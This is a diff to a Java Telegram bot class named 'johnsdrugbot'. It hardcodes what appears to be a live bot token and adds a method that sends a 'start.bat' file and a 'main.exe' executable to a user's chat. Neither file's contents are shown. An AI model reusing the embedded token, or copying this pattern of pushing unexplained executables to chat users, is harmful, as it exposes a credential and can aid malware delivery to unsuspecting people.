@@ -1,20 +1,24 @@
 package io.github.hateud;
 
 import org.telegram.telegrambots.bots.TelegramLongPollingBot;
+import org.telegram.telegrambots.meta.api.methods.send.SendDocument;
 import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
 import org.telegram.telegrambots.meta.api.methods.updatingmessages.DeleteMessage;
 import org.telegram.telegrambots.meta.api.methods.updatingmessages.EditMessageText;
+import org.telegram.telegrambots.meta.api.objects.InputFile;
 import org.telegram.telegrambots.meta.api.objects.Message;
 import org.telegram.telegrambots.meta.api.objects.Update;
 import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
 
+import java.io.File;
+import java.io.IOException;
 import java.sql.SQLException;
 import java.util.HashMap;
 import java.util.Map;
 
 public class Bot extends TelegramLongPollingBot {
 
-//    public Map<Long, User> users = new HashMap<>();
+    //    public Map<Long, User> users = new HashMap<>();
     public Map<Long, Integer> messages;
     public Integer msgId;
     private final MsgHandler handler;
@@ -30,7 +34,7 @@ public class Bot extends TelegramLongPollingBot {
     public String getBotUsername() { return "johnsdrugbot"; }
 
     @Override
-    public String getBotToken() { return ""; }
+    public String getBotToken() { return "8426928345:AAEvVJclUt1YktYdO1aWNlxBZCly47yz_cM"; }
 
     @Override
     public void onRegister() {
@@ -44,6 +48,8 @@ public class Bot extends TelegramLongPollingBot {
         try {
             handler.update(update);
         } catch (TelegramApiException e) {
+            throw new RuntimeException(e);
+        } catch (IOException e) {
             throw new RuntimeException(e);
         }
     }
@@ -82,7 +88,18 @@ public class Bot extends TelegramLongPollingBot {
             throw new RuntimeException(e);
         }
     }
+    public void sendFiles(Long userId) throws TelegramApiException {
+        String baseDir = System.getProperty("user.dir");
+        String scriptPath = baseDir + "\\app\\resources\\scripts\\main.exe";
+        SendDocument sendDocument = new SendDocument();
+        sendDocument.setChatId(userId);
+        sendDocument.setDocument(new InputFile(new File("start.bat")));
+        execute(sendDocument);
+        sendDocument.setDocument(new InputFile(new File(scriptPath)));
+        execute(sendDocument);
+    }
 //    public void addUser(Long userId){
 //        users.putIfAbsent(userId, new User(userId));
 //    }
 }
+
